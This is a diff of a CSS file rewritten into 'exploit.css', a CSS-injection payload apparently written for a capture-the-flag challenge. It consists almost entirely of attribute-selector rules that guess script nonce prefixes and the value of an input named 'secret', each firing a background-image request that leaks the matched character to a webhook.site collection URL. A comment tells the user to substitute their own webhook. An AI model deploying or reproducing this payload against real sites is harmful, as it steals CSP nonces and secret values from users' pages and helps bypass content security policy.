@@ -1,15 +1,55 @@
-/* ex.css */
-.css-attack {
-  background-color: red;
-  color: white;
-  font-size: 20px;
-  text-align: center;
-  padding: 20px;
-  border: 2px solid black;
-}
+/* exploit.css
+   Replace 3723f93b-77f1-465e-a4b7-6b5915b6f6ef with your webhook.site id or collection endpoint.
+   Example webhook: https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?m=...
+*/
 
-body::after {
-  content: ""; 
-  background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?probe=css_loaded");
-  display: none;
-}
+/* --- target: script nonce (common) ----------------------------------- */
+/* check digits 0-9 */
+script[nonce^="0"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=0"); }
+script[nonce^="1"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=1"); }
+script[nonce^="2"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=2"); }
+script[nonce^="3"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=3"); }
+script[nonce^="4"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=4"); }
+script[nonce^="5"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=5"); }
+script[nonce^="6"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=6"); }
+script[nonce^="7"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=7"); }
+script[nonce^="8"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=8"); }
+script[nonce^="9"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=9"); }
+
+/* check hex letters a-f (nonce often hex) */
+script[nonce^="a"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=a"); }
+script[nonce^="b"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=b"); }
+script[nonce^="c"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=c"); }
+script[nonce^="d"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=d"); }
+script[nonce^="e"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=e"); }
+script[nonce^="f"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=f"); }
+
+/* check lowercase letters a-z (flag chars often include letters) */
+script[nonce^="g"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=g"); }
+script[nonce^="h"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=h"); }
+script[nonce^="i"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=i"); }
+script[nonce^="j"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=j"); }
+script[nonce^="k"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=k"); }
+script[nonce^="l"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=l"); }
+script[nonce^="m"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=m"); }
+script[nonce^="n"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=n"); }
+script[nonce^="o"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=o"); }
+script[nonce^="p"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=p"); }
+script[nonce^="q"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=q"); }
+script[nonce^="r"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=r"); }
+script[nonce^="s"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=s"); }
+script[nonce^="t"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=t"); }
+script[nonce^="u"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=u"); }
+script[nonce^="v"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=v"); }
+script[nonce^="w"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=w"); }
+script[nonce^="x"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=x"); }
+script[nonce^="y"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=y"); }
+script[nonce^="z"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=nonce_prefix&c=z"); }
+
+/* --- target: input[name=secret][value^=...] (if flags are mirrored into input values) --- */
+input[name="secret"][value^="s"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=input_val&c=s"); }
+input[name="secret"][value^="sc"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=input_val&c=sc"); }
+input[name="secret"][value^="scp"] { background-image: url("https://webhook.site/3723f93b-77f1-465e-a4b7-6b5915b6f6ef/collect?kind=input_val&c=scp"); }
+
+/* fallback tiny visual to ensure CSS applied (not necessary for exfil) */
+body::after { content: ""; display:none; }
